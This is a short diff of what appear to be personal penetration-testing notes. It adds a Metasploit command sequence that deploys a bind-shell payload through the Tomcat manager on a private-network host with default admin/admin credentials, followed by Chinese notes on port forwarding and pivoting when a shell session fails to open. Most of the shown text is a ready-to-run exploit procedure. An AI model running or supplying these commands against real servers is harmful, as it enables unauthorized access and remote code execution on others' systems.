@@ -1,4 +1,15 @@
-﻿[portfwd&pivot] -- start
+
+use exploit/multi/http/tomcat_mgr_deploy
+set rhost 192.168.2.125
+set rport 8080
+set username admin
+set password admin
+set payload java/shell/bind_tcp
+set path /manager/html
+exploit
+
+
+[portfwd&pivot] -- start
 只能正向连接，反向不通的时候，常常会出现
 [*] Exploit completed, but no session was created.
 这个时候就需要跳板来转发：
